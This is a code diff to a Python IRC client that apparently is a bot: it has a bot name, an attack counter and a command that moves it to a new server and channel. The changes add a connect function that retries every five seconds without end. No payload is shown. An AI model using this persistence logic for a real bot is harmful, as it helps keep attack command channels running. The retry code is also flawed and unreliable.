@@ -1,4 +1,4 @@
-import random, socket, sys
+import random, socket, sys, time
 
 HOST = ""
 PORT = -1
@@ -12,6 +12,15 @@ botName = ""
 atk_couter=1
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def connect():
+    try:
+        s.connect((HOST, PORT))
+        return
+    except:
+        time.sleep(5)
+        connect()
+
 
 def startConn():
 
@@ -137,17 +146,8 @@ def move(newhost, newport, newchan, clientNick):
     global CHAN
     CHAN="#"+newchan
 
-    s2 = None
-    try:
-        print(HOST)
-        print(PORT)
-
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((HOST, PORT))
-    except:
-        print("failed to move to new channel")  # we may want to handle a few more specific errors, this is general for now
-        sys.exit(1)
-
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect()
     startConn()
 
     #if failure, keep trying? or maybe stay on old IRC?
@@ -166,6 +166,5 @@ if __name__ == '__main__':
     PORT = int(sys.argv[2])
     CHAN = "#" + sys.argv[3]
     PASS = sys.argv[4]
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((HOST, PORT))
+    connect()
     startConn()
